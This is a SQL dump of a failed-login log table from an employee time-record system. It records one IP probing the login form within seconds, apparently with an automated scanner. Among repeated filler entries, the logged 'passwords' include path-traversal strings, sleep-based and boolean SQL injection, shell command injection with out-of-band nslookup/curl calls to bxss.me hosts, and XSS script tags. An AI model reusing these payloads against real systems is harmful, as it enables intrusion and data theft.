INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('573', '', '2023-05-08 03:41:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('574', '', '2023-05-08 03:41:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('575', '', '2023-05-08 03:41:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('576', '', '2023-05-08 03:41:59', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('577', '', '2023-05-08 03:41:59', '', 'Invalid username/password. Tried with: \'\"()', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('578', '', '2023-05-08 03:41:59', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('579', '', '2023-05-08 03:41:59', '', 'Invalid username/password. Tried with: ../../../../../../../../../../../../../../etc/passwd', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('580', '', '2023-05-08 03:41:59', '', 'Invalid username/password. Tried with: RDFYjolf\'&&sleep(27*1000)*clcwns&&\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('581', '', '2023-05-08 03:41:59', '', 'Invalid username/password. Tried with: echo yvuvsv$()\\ dlyubm\\nz^xyu||a #\' &echo yvuvsv$()\\ dlyubm\\nz^xyu||a #|\" &echo yvuvsv$()\\ dlyubm\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('582', '', '2023-05-08 03:41:59', '', 'Invalid username/password. Tried with: ../../../../../../../../../../../../../../windows/win.ini', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('583', '', '2023-05-08 03:41:59', '', 'Invalid username/password. Tried with: RDFYjolf\"&&sleep(27*1000)*ulpzwf&&\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('584', '', '2023-05-08 03:41:59', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('585', '', '2023-05-08 03:41:59', '', 'Invalid username/password. Tried with: &echo kbgbqb$()\\ rtlowy\\nz^xyu||a #\' &echo kbgbqb$()\\ rtlowy\\nz^xyu||a #|\" &echo kbgbqb$()\\ rtlowy\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('586', '', '2023-05-08 03:41:59', '', 'Invalid username/password. Tried with: file:///etc/passwd', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('587', '', '2023-05-08 03:42:00', '', 'Invalid username/password. Tried with: RDFYjolf\'||sleep(27*1000)*gftwua||\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('588', '', '2023-05-08 03:42:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('589', '', '2023-05-08 03:42:00', '', 'Invalid username/password. Tried with: |echo qmshzg$()\\ zxszxr\\nz^xyu||a #\' |echo qmshzg$()\\ zxszxr\\nz^xyu||a #|\" |echo qmshzg$()\\ zxszxr\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('590', '', '2023-05-08 03:42:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('591', '', '2023-05-08 03:42:00', '', 'Invalid username/password. Tried with: RDFYjolf\"||sleep(27*1000)*exphvz||\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('592', '', '2023-05-08 03:42:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('593', '', '2023-05-08 03:42:00', '', 'Invalid username/password. Tried with: (nslookup -q=cname hitcaibgeqdfu27207.bxss.me||curl hitcaibgeqdfu27207.bxss.me))', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('594', '', '2023-05-08 03:42:00', '', 'Invalid username/password. Tried with: ../RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('595', '', '2023-05-08 03:42:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('596', '', '2023-05-08 03:42:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('597', '', '2023-05-08 03:42:00', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('598', '', '2023-05-08 03:42:00', '', 'Invalid username/password. Tried with: $(nslookup -q=cname hitdkjgmwwmgyf0ee4.bxss.me||curl hitdkjgmwwmgyf0ee4.bxss.me)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('599', '', '2023-05-08 03:42:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('600', '', '2023-05-08 03:42:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('601', '', '2023-05-08 03:42:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('602', '', '2023-05-08 03:42:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('603', '', '2023-05-08 03:42:01', '', 'Invalid username/password. Tried with: &nslookup -q=cname hitndcqexghif26816.bxss.me&\'\\\"`0&nslookup -q=cname hitndcqexghif26816.bxss.me&`\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('604', '', '2023-05-08 03:42:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('605', '', '2023-05-08 03:42:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('606', '', '2023-05-08 03:42:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('607', '', '2023-05-08 03:42:01', '', 'Invalid username/password. Tried with: &(nslookup -q=cname hitlzmmkisqok8f031.bxss.me||curl hitlzmmkisqok8f031.bxss.me)&\'\\\"`0&(nslookup -q=cname hitlz', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('608', '', '2023-05-08 03:42:01', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('609', '', '2023-05-08 03:42:02', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('610', '', '2023-05-08 03:42:02', '', 'Invalid username/password. Tried with: |(nslookup -q=cname hitylgqebgibo961dc.bxss.me||curl hitylgqebgibo961dc.bxss.me)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('611', '', '2023-05-08 03:42:02', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('612', '', '2023-05-08 03:42:02', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('613', '', '2023-05-08 03:42:02', '', 'Invalid username/password. Tried with: `(nslookup -q=cname hituzyodrpcyc36742.bxss.me||curl hituzyodrpcyc36742.bxss.me)`', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('614', '', '2023-05-08 03:42:02', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('615', '', '2023-05-08 03:42:02', '', 'Invalid username/password. Tried with: ;(nslookup -q=cname hitwvrgstjshr5c0a5.bxss.me||curl hitwvrgstjshr5c0a5.bxss.me)|(nslookup -q=cname hitwvrgstjs', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('616', '', '2023-05-08 03:42:02', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('617', '', '2023-05-08 03:42:02', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('618', '', '2023-05-08 03:42:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('619', '', '2023-05-08 03:42:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('620', '', '2023-05-08 03:42:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('621', '', '2023-05-08 03:42:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('622', '', '2023-05-08 03:42:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('623', '', '2023-05-08 03:42:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('624', '', '2023-05-08 03:42:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('625', '', '2023-05-08 03:42:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('626', '', '2023-05-08 03:42:03', '', 'Invalid username/password. Tried with: ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('627', '', '2023-05-08 03:42:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('628', '', '2023-05-08 03:42:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('629', '', '2023-05-08 03:42:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('630', '', '2023-05-08 03:42:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('631', '', '2023-05-08 03:42:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('632', '', '2023-05-08 03:42:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('633', '', '2023-05-08 03:42:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('634', '', '2023-05-08 03:42:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('635', '', '2023-05-08 03:42:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('636', '', '2023-05-08 03:42:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('637', '', '2023-05-08 03:42:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('638', '', '2023-05-08 03:42:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('639', '', '2023-05-08 03:42:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('640', '', '2023-05-08 03:42:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('641', '', '2023-05-08 03:42:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('642', '', '2023-05-08 03:42:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('643', '', '2023-05-08 03:42:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('644', '', '2023-05-08 03:42:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('645', '', '2023-05-08 03:42:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('646', '', '2023-05-08 03:42:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('647', '', '2023-05-08 03:42:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('648', '', '2023-05-08 03:42:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('649', '', '2023-05-08 03:42:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('650', '', '2023-05-08 03:42:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('651', '', '2023-05-08 03:42:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('652', '', '2023-05-08 03:42:06', '', 'Invalid username/password. Tried with: 1C9xD5vsTrO', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('653', '', '2023-05-08 03:42:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('654', '', '2023-05-08 03:42:06', '', 'Invalid username/password. Tried with: xfs.bxss.me', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('655', '', '2023-05-08 03:42:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('656', '', '2023-05-08 03:42:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('657', '', '2023-05-08 03:42:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('658', '', '2023-05-08 03:42:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('659', '', '2023-05-08 03:42:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('660', '', '2023-05-08 03:42:07', '', 'Invalid username/password. Tried with: \'\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('661', '', '2023-05-08 03:42:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('662', '', '2023-05-08 03:42:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('663', '', '2023-05-08 03:42:07', '', 'Invalid username/password. Tried with: RDFYjolf\'\"()&%<zzz><ScRiPt >jIXt(9415)</ScRiPt>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('664', '', '2023-05-08 03:42:07', '', 'Invalid username/password. Tried with: <!--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('665', '', '2023-05-08 03:42:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('666', '', '2023-05-08 03:42:07', '', 'Invalid username/password. Tried with: \'\"()&%<zzz><ScRiPt >jIXt(9777)</ScRiPt>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('667', '', '2023-05-08 03:42:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('668', '', '2023-05-08 03:42:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('669', '', '2023-05-08 03:42:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('670', '', '2023-05-08 03:42:08', '', 'Invalid username/password. Tried with: RDFYjolf9719514', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('671', '', '2023-05-08 03:42:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('672', '', '2023-05-08 03:42:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('673', '', '2023-05-08 03:42:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('674', '', '2023-05-08 03:42:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('675', '', '2023-05-08 03:42:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('676', '', '2023-05-08 03:42:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('677', '', '2023-05-08 03:42:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('678', '', '2023-05-08 03:42:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('679', '', '2023-05-08 03:42:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('680', '', '2023-05-08 03:42:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('681', '', '2023-05-08 03:42:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('682', '', '2023-05-08 03:42:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('683', '', '2023-05-08 03:42:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('684', '', '2023-05-08 03:42:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('685', '', '2023-05-08 03:42:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('686', '', '2023-05-08 03:42:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('687', '', '2023-05-08 03:42:10', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('688', '', '2023-05-08 03:42:11', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('689', '', '2023-05-08 03:42:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('690', '', '2023-05-08 03:42:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('691', '', '2023-05-08 03:42:13', '', 'Invalid username/password. Tried with: 5TXPPANi', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('692', '', '2023-05-08 03:42:13', '', 'Invalid username/password. Tried with: -1 OR 2+279-279-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('693', '', '2023-05-08 03:42:14', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('694', '', '2023-05-08 03:42:14', '', 'Invalid username/password. Tried with: -1 OR 2+379-379-1=0+0+0+1', '107.178.112.106');
